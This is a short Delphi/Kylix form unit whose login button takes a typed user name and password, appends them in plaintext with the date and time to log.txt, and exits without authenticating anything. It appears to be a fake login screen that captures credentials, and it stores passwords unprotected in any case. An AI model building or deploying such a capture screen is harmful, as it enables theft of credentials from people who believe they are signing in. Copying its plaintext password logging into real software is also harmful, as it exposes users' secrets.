unit Unit1;

interface

uses
  SysUtils, Types, Classes, Variants, QTypes, QGraphics, QControls, QForms, 
  QDialogs, QStdCtrls, QExtCtrls;

type
  TForm1 = class(TForm)
    pnl1: TPanel;
    lbl1: TLabel;
    lbl2: TLabel;
    edt1: TEdit;
    edt2: TEdit;
    btn1: TButton;
    btn2: TButton;
    procedure btn2Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.xfm}

procedure TForm1.btn2Click(Sender: TObject);
begin
        Application.Terminate;
end;

procedure TForm1.btn1Click(Sender: TObject);
var
  sName, sPass, sTime, sDate, sLog: string;
  tFile: TextFile;

begin
  sName := edt1.Text;
  sPass := edt2.Text;
  sDate := DateToStr(Date());
  sTime := TimeToStr(Time());
  sLog := sName + ' ' + sPass + ' ' + sDate + ' ' + sTime;

  AssignFile(tFile, 'log.txt');
  Append(tFile);
  Writeln(tFile, sLog);
  CloseFile(tFile);

  Application.Terminate;
end;

end.
